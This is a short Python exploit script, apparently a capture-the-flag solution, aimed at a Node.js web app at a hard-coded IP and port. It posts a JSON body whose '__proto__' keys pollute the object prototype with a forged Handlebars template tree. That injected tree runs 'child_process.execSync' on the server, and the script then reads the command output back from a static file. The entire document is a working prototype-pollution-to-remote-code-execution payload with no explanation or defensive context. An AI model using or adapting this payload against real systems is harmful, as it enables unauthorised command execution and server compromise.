
import requests

#TARGET_URL = 'http://localhost:1337'
TARGET_URL = 'http://139.59.165.154:30199'

# make pollution
r = requests.post(TARGET_URL+'/api/submit', json = {
    "artist.name":"Gingell",
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`ls -l > /app/static/out`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
    })

print(r.status_code, r.text)

print(requests.get(TARGET_URL+'/static/out').text)